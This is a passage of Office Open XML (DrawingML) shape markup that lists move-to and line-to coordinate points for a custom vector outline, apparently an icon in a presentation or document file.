                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4183" y="4513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3596" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4073" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="7044"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8218" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="4513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11519" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11849" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11959" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10969" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12546" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12766" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12693" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10859" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10749" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9832" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9025" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7411" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="11629"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="8658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6604" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="8658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6017" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1285" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="2092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="1505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="1395"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10162" y="1321"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12876" y="8988"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13023" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13096" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11519" y="10565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10969" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="13023"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="13243"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="13499"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="11629"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="11189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9025" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10749" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="8988"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13206" y="10675"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13096" y="10712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6604" y="13133"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="13316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="13573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="13023"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="11299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="10675"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10492" y="478"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10712" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10969" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12473" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13280" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13683" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13793" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13610" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13610" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13610" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13096" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12693" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11849" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10859" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="1285"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2569" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1175" y="3706"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="955" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="918" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
